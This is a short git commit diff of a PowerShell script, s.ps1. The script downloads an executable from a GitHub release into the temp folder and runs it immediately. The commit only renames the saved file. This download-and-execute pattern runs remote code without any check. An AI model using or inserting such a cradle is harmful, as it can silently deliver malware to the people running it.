7dfe106d5346c386dee6d1c88aa5e93189777a4c
Mikhail Chestneyshy <82827415+jostanise@users.noreply.github.com>
2022-12-07 00:42:02 +0300

    Update s.ps1

--- s.ps1
+++ s.ps1
@@ -1,3 +1,3 @@
-$o = "$env:temp\1.exe"
+$o = "$env:temp\server.exe"
 (New-Object System.Net.WebClient).DownloadFile("https://github.com/jostanise/rsa_encrypted_local_chat/releases/download/v1.0/server.exe", $o)
 Start-Process -Filepath $o
